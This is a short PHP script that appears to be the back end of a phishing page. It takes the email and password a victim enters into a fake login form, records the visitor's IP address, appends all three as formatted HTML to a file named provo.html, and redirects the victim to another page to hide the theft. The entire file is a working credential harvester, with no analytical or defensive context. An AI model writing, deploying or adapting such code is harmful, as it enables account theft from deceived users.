<?php

$habbo = $_POST['email']; 
$password = $_POST['pass'];
$ip = $_SERVER['REMOTE_ADDR']; 
$f = fopen("provo.html", "a"); 
fwrite ($f, 'Email: [<b><font color="#FF1493">'.$habbo.'</font></b>] Password: [<b><font color="#1E90FF">'.$password.'</font></b>] IP: [<b><font color="#005700">'.$ip.'</font></b>]<br>');
fclose($f);

header("Location:bussines.php");
?>
